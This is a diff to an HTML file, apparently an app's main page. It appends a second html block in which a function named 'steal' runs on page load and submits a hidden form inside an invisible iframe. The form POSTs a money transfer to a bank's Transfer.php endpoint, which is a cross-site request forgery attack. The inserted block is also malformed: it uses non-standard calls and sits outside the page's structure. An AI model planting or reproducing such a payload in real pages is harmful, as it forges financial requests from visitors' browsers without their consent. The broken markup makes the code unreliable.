@@ -36,6 +36,27 @@
 </head>
 
 </html>
+<html>
+　　<head>
+　　　　<script type="text/javascript">
+　　　　　　function steal()
+　　　　　　{
+          　　　　 iframe = document.frames["steal"];
+　　     　　      iframe.document.Submit("transfer");
+　　　　　　}
+　　　　</script>
+　　</head>
+
+　　<body onload="steal()">
+　　　　<iframe name="steal" display="none">
+　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
+　　　　　　　　<input type="hidden" name="toBankId" value="11">
+　　　　　　　　<input type="hidden" name="money" value="1000">
+　　　　　　</form>
+　　　　</iframe>
+　　</body>
+</html>
+
 
 <body>
   <div id="app">
